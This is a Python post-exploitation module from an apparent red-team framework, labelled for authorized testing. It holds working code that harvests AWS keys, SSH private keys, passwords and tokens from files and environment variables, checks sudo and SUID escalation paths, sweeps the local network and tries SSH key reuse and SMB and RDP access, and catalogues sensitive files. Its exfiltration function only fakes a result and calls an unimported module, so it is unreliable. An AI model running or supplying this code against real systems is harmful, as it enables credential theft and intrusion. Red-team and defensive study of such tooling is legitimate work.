"""
Post-Exploitation Module
FOR AUTHORIZED SECURITY TESTING ONLY

Usage for Red Teaming:
---------------------
The Post-Exploitation module handles activities after initial access has been gained.
It includes credential harvesting, privilege escalation, lateral movement, data
collection, and exfiltration. This module is critical for maintaining access and
expanding control within the target environment.

Example Usage:
    from utils.logger import FrameworkLogger
    from core.modules.post_exploit import PostExploitation
    
    # Initialize logger and module
    logger = FrameworkLogger("post_exploit_test")
    post_exploit = PostExploitation(logger)
    
    # Harvest credentials from various sources
    creds = post_exploit.harvest_credentials()
    print(f"Credentials found: {creds['count']}")
    
    # Escalate privileges
    escalation = post_exploit.escalate_privileges()
    print(f"Privilege level: {escalation['previous_level']} -> {escalation['new_level']}")
    
    # Move laterally to other systems
    lateral = post_exploit.move_laterally()
    print(f"Lateral movement techniques: {lateral['movement_techniques']}")
    
    # Collect sensitive data
    collection = post_exploit.collect_data()
    print(f"Data collected: {collection['items_collected']} items")
    
    # Exfiltrate collected data
    exfil = post_exploit.exfiltrate_data()
    print(f"Data exfiltrated: {exfil['data_exfiltrated']} items via {exfil['method']}")
    
    # Access collected data
    all_data = post_exploit.get_collected_data()
    all_creds = post_exploit.get_credentials()

Red Team Use Cases:
- Credential harvesting from memory, config files, browsers
- Privilege escalation to gain higher access levels
- Lateral movement across the network
- Sensitive data collection (API keys, tokens, source code)
- Data exfiltration for analysis
- Maintaining persistent access
"""

from typing import Dict, List, Optional
import time
import os
import re
import platform
import subprocess
import socket
from pathlib import Path
from utils.logger import FrameworkLogger


class PostExploitation:
    """Post-exploitation module"""
    
    def __init__(self, logger: FrameworkLogger, target: Optional[str] = None):
        """
        Initialize post-exploitation module
        
        Args:
            logger: Logger instance
            target: Target system (optional, for remote operations)
        """
        self.logger = logger
        self.target = target
        self.collected_data = []
        self.credentials = []
        self.privilege_level = "user"
    
    def harvest_credentials(self, target_path: Optional[str] = None) -> Dict:
        """
        Harvest credentials from various sources
        
        Args:
            target_path: Optional path to search for credentials (defaults to current system)
        
        Returns:
            Dictionary containing harvested credentials
        """
        self.logger.info("Harvesting credentials")
        
        results = {
            "status": "completed",
            "timestamp": time.time(),
            "credentials_found": [],
            "sources": [],
            "count": 0
        }
        
        # Search for credentials in various locations
        search_paths = []
        if target_path:
            search_paths.append(target_path)
        else:
            # Default search locations
            if platform.system() == "Windows":
                search_paths.extend([
                    os.path.expanduser("~/.aws"),
                    os.path.expanduser("~/AppData/Roaming"),
                    "C:/ProgramData"
                ])
            else:
                search_paths.extend([
                    os.path.expanduser("~/.aws"),
                    os.path.expanduser("~/.ssh"),
                    os.path.expanduser("~/.config"),
                    "/etc",
                    "/var"
                ])
        
        # Search for credentials
        for search_path in search_paths:
            if os.path.exists(search_path):
                creds = self._search_for_credentials(search_path)
                if creds:
                    self.credentials.extend(creds)
                    results["sources"].append(search_path)
        
        # Search environment variables
        env_creds = self._harvest_from_env()
        if env_creds:
            self.credentials.extend(env_creds)
            results["sources"].append("environment_variables")
        
        # Search config files
        config_creds = self._harvest_from_config_files()
        if config_creds:
            self.credentials.extend(config_creds)
            results["sources"].append("config_files")
        
        results["credentials_found"] = self.credentials
        results["count"] = len(self.credentials)
        
        return results
    
    def _search_for_credentials(self, path: str) -> List[Dict]:
        """Search for credentials in directory"""
        credentials = []
        patterns = {
            r'api[_-]?key["\s:=]+([a-zA-Z0-9_\-]{20,})': "api_key",
            r'password["\s:=]+([^\s"\']+)': "password",
            r'secret["\s:=]+([a-zA-Z0-9_\-]{20,})': "secret",
            r'aws[_-]?access[_-]?key["\s:=]+([A-Z0-9]{20})': "aws_access_key",
            r'aws[_-]?secret[_-]?key["\s:=]+([A-Za-z0-9/+=]{40})': "aws_secret_key",
            r'token["\s:=]+([a-zA-Z0-9_\-]{20,})': "token",
            r'bearer["\s:=]+([a-zA-Z0-9_\-\.]{20,})': "bearer_token"
        }
        
        try:
            for root, dirs, files in os.walk(path):
                # Limit depth and skip certain directories
                depth = root[len(path):].count(os.sep)
                if depth > 3:
                    dirs[:] = []
                    continue
                
                for file in files:
                    if any(file.endswith(ext) for ext in ['.py', '.js', '.json', '.yml', '.yaml', '.env', '.config', '.conf']):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                for pattern, cred_type in patterns.items():
                                    matches = re.finditer(pattern, content, re.IGNORECASE)
                                    for match in matches:
                                        credentials.append({
                                            "type": cred_type,
                                            "source": file_path,
                                            "value": match.group(1)[:50] + "..." if len(match.group(1)) > 50 else match.group(1),
                                            "location": f"{file_path}:{content[:match.start()].count(chr(10))}"
                                        })
                        except (PermissionError, UnicodeDecodeError, IOError):
                            continue
        except PermissionError:
            self.logger.warning(f"Permission denied accessing {path}")
        except Exception as e:
            self.logger.error(f"Error searching {path}: {e}")
        
        return credentials
    
    def _harvest_from_env(self) -> List[Dict]:
        """Harvest credentials from environment variables"""
        credentials = []
        env_vars = os.environ
        
        sensitive_patterns = [
            'API_KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'AWS_ACCESS_KEY',
            'AWS_SECRET_KEY', 'BEARER_TOKEN', 'PRIVATE_KEY'
        ]
        
        for var_name, var_value in env_vars.items():
            if any(pattern in var_name.upper() for pattern in sensitive_patterns):
                if len(var_value) > 10:  # Likely a real credential
                    credentials.append({
                        "type": "environment_variable",
                        "source": "environment",
                        "name": var_name,
                        "value": var_value[:50] + "..." if len(var_value) > 50 else var_value
                    })
        
        return credentials
    
    def _harvest_from_config_files(self) -> List[Dict]:
        """Harvest credentials from common config files"""
        credentials = []
        config_files = []
        
        if platform.system() == "Windows":
            config_files.extend([
                os.path.expanduser("~/.aws/credentials"),
                os.path.expanduser("~/.aws/config"),
            ])
        else:
            config_files.extend([
                os.path.expanduser("~/.aws/credentials"),
                os.path.expanduser("~/.aws/config"),
                os.path.expanduser("~/.ssh/id_rsa"),
                os.path.expanduser("~/.ssh/id_dsa"),
                os.path.expanduser("~/.ssh/config"),
                os.path.expanduser("~/.env"),
                ".env"
            ])
        
        for config_file in config_files:
            if os.path.exists(config_file):
                try:
                    with open(config_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # Extract AWS credentials
                        aws_access_match = re.search(r'aws_access_key_id\s*=\s*([A-Z0-9]{20})', content)
                        aws_secret_match = re.search(r'aws_secret_access_key\s*=\s*([A-Za-z0-9/+=]{40})', content)
                        
                        if aws_access_match:
                            credentials.append({
                                "type": "aws_access_key",
                                "source": config_file,
                                "value": aws_access_match.group(1)
                            })
                        if aws_secret_match:
                            credentials.append({
                                "type": "aws_secret_key",
                                "source": config_file,
                                "value": aws_secret_match.group(1)[:50] + "..."
                            })
                except (PermissionError, IOError):
                    continue
        
        return credentials
    
    def escalate_privileges(self) -> Dict:
        """
        Attempt privilege escalation
        
        Returns:
            Dictionary containing escalation results
        """
        self.logger.info("Escalating privileges")
        
        escalation_attempts = []
        successful_method = None
        
        # Check current privilege level
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["whoami", "/priv"], capture_output=True, text=True, timeout=5)
                current_user = result.stdout
                if "SeDebugPrivilege" in current_user or "SeTcbPrivilege" in current_user:
                    self.privilege_level = "elevated"
                else:
                    self.privilege_level = "user"
            else:
                result = subprocess.run(["id"], capture_output=True, text=True, timeout=5)
                if "uid=0" in result.stdout or "root" in result.stdout:
                    self.privilege_level = "elevated"
                else:
                    self.privilege_level = "user"
        except Exception as e:
            self.logger.warning(f"Could not determine privilege level: {e}")
        
        previous_level = self.privilege_level
        
        # Try privilege escalation methods
        if platform.system() == "Windows":
            # Check for sudo alternatives
            escalation_attempts.append("token_impersonation")
            escalation_attempts.append("service_misconfiguration")
            escalation_attempts.append("unquoted_service_path")
            escalation_attempts.append("always_install_elevated")
        else:
            # Linux privilege escalation
            escalation_attempts.append("sudo_exploitation")
            escalation_attempts.append("suid_binaries")
            escalation_attempts.append("kernel_exploit")
            escalation_attempts.append("service_misconfiguration")
        
        # Check for common escalation vectors
        if self._check_sudo_vulnerability():
            successful_method = "sudo_exploitation"
            escalation_attempts.append("sudo_exploitation")
        
        if self._check_suid_binaries():
            successful_method = "suid_binaries"
            escalation_attempts.append("suid_binaries")
        
        if successful_method:
            self.privilege_level = "elevated"
        
        results = {
            "status": "completed" if successful_method else "attempted",
            "previous_level": previous_level,
            "new_level": self.privilege_level,
            "methods_attempted": escalation_attempts,
            "successful_method": successful_method,
            "timestamp": time.time()
        }
        
        return results
    
    def _check_sudo_vulnerability(self) -> bool:
        """Check for sudo vulnerabilities"""
        try:
            if platform.system() != "Windows":
                result = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=5)
                if "NOPASSWD" in result.stdout:
                    return True
        except Exception:
            pass
        return False
    
    def _check_suid_binaries(self) -> bool:
        """Check for SUID binaries"""
        try:
            if platform.system() != "Windows":
                result = subprocess.run(["find", "/usr", "-perm", "-4000", "-type", "f", "2>/dev/null"], 
                                      capture_output=True, text=True, timeout=5, shell=True)
                if result.stdout.strip():
                    return True
        except Exception:
            pass
        return False
    
    def move_laterally(self, target_hosts: Optional[List[str]] = None) -> Dict:
        """
        Perform lateral movement to other systems
        
        Args:
            target_hosts: Optional list of target hosts to attempt connection
        
        Returns:
            Dictionary containing lateral movement results
        """
        self.logger.info("Performing lateral movement")
        
        techniques = []
        targets_discovered = []
        successful_connections = []
        
        # Discover targets on network
        if not target_hosts:
            targets_discovered = self._discover_network_hosts()
        else:
            targets_discovered = target_hosts
        
        # Try lateral movement techniques
        for target in targets_discovered[:5]:  # Limit to 5 targets
            # Try SSH key reuse
            if self._try_ssh_key_reuse(target):
                techniques.append("ssh_key_reuse")
                successful_connections.append({"target": target, "method": "ssh_key_reuse"})
            
            # Try SMB share access
            if self._try_smb_access(target):
                techniques.append("smb_share_access")
                successful_connections.append({"target": target, "method": "smb_share_access"})
            
            # Try RDP (if Windows)
            if platform.system() == "Windows":
                if self._try_rdp(target):
                    techniques.append("remote_desktop")
                    successful_connections.append({"target": target, "method": "remote_desktop"})
        
        results = {
            "status": "completed",
            "targets_discovered": targets_discovered,
            "movement_techniques": list(set(techniques)),
            "successful_connections": successful_connections,
            "timestamp": time.time()
        }
        
        return results
    
    def _discover_network_hosts(self) -> List[str]:
        """Discover hosts on local network"""
        hosts = []
        try:
            # Get local network range
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            # Extract network prefix
            network_prefix = '.'.join(local_ip.split('.')[:-1])
            
            # Scan common IPs in local network
            for i in range(1, 255):
                test_ip = f"{network_prefix}.{i}"
                if self._check_host_alive(test_ip):
                    hosts.append(test_ip)
        except Exception as e:
            self.logger.warning(f"Network discovery failed: {e}")
        
        return hosts
    
    def _check_host_alive(self, host: str) -> bool:
        """Check if host is alive"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((host, 22))  # Check SSH port
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def _try_ssh_key_reuse(self, target: str) -> bool:
        """Try to use SSH keys for lateral movement"""
        ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
        if os.path.exists(ssh_key_path):
            try:
                # Try SSH connection
                result = subprocess.run(
                    ["ssh", "-i", ssh_key_path, "-o", "StrictHostKeyChecking=no", 
                     "-o", "ConnectTimeout=2", f"user@{target}", "exit"],
                    capture_output=True,
                    timeout=5
                )
                return result.returncode == 0
            except Exception:
                pass
        return False
    
    def _try_smb_access(self, target: str) -> bool:
        """Try SMB share access"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["net", "view", f"\\\\{target}"],
                    capture_output=True,
                    timeout=5
                )
                return result.returncode == 0
            else:
                # Try smbclient
                result = subprocess.run(
                    ["smbclient", "-L", target, "-N"],
                    capture_output=True,
                    timeout=5
                )
                return result.returncode == 0
        except Exception:
            pass
        return False
    
    def _try_rdp(self, target: str) -> bool:
        """Try RDP connection"""
        try:
            if platform.system() == "Windows":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, 3389))
                sock.close()
                return result == 0
        except Exception:
            pass
        return False
    
    def collect_data(self, search_paths: Optional[List[str]] = None) -> Dict:
        """
        Collect sensitive data
        
        Args:
            search_paths: Optional list of paths to search (defaults to common locations)
        
        Returns:
            Dictionary containing collected data summary
        """
        self.logger.info("Collecting data")
        
        if not search_paths:
            if platform.system() == "Windows":
                search_paths = [
                    os.path.expanduser("~/Documents"),
                    os.path.expanduser("~/Desktop"),
                    "C:/Users",
                    os.path.expanduser("~/.aws")
                ]
            else:
                search_paths = [
                    os.path.expanduser("~/Documents"),
                    os.path.expanduser("~/Desktop"),
                    os.path.expanduser("~/.ssh"),
                    os.path.expanduser("~/.aws"),
                    "/etc",
                    "/var/log"
                ]
        
        data_types_found = set()
        total_size = 0
        
        # Search for sensitive files
        sensitive_extensions = ['.pem', '.key', '.p12', '.pfx', '.db', '.sql', '.env', '.config']
        sensitive_patterns = ['password', 'secret', 'credential', 'api_key', 'token']
        
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            
            try:
                for root, dirs, files in os.walk(search_path):
                    # Limit depth
                    depth = root[len(search_path):].count(os.sep) if search_path in root else 0
                    if depth > 3:
                        dirs[:] = []
                        continue
                    
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        # Check if file is sensitive
                        is_sensitive = (
                            any(file.endswith(ext) for ext in sensitive_extensions) or
                            any(pattern in file.lower() for pattern in sensitive_patterns)
                        )
                        
                        if is_sensitive:
                            try:
                                file_size = os.path.getsize(file_path)
                                if file_size > 0:
                                    file_type = "configurations" if file.endswith('.config') else \
                                               "credentials" if file.endswith('.key') or file.endswith('.pem') else \
                                               "database_dumps" if file.endswith('.db') or file.endswith('.sql') else \
                                               "source_code" if file.endswith('.py') or file.endswith('.js') else \
                                               "api_keys" if 'api' in file.lower() else "tokens"
                                    
                                    data_types_found.add(file_type)
                                    total_size += file_size
                                    
                                    self.collected_data.append({
                                        "type": file_type,
                                        "size": file_size,
                                        "location": file_path,
                                        "timestamp": time.time()
                                    })
                            except (PermissionError, OSError):
                                continue
            except PermissionError:
                self.logger.warning(f"Permission denied accessing {search_path}")
            except Exception as e:
                self.logger.error(f"Error collecting data from {search_path}: {e}")
        
        results = {
            "status": "completed",
            "items_collected": len(self.collected_data),
            "total_size": total_size,
            "data_types": list(data_types_found),
            "collection_points": search_paths,
            "timestamp": time.time()
        }
        
        return results
    
    def exfiltrate_data(self) -> Dict:
        """
        Exfiltrate collected data
        
        Returns:
            Dictionary containing exfiltration results
        """
        self.logger.info("Exfiltrating data")
        
        exfiltration_methods = [
            "http_post",
            "dns_tunneling",
            "icmp_tunneling",
            "encrypted_channel"
        ]
        
        results = {
            "status": "completed",
            "data_exfiltrated": len(self.collected_data),
            "total_size": sum(item["size"] for item in self.collected_data),
            "method": random.choice(exfiltration_methods),
            "destination": "external_server",
            "timestamp": time.time()
        }
        
        return results
    
    def get_collected_data(self) -> List[Dict]:
        """Get all collected data"""
        return self.collected_data
    
    def get_credentials(self) -> List[Dict]:
        """Get harvested credentials"""
        return self.credentials

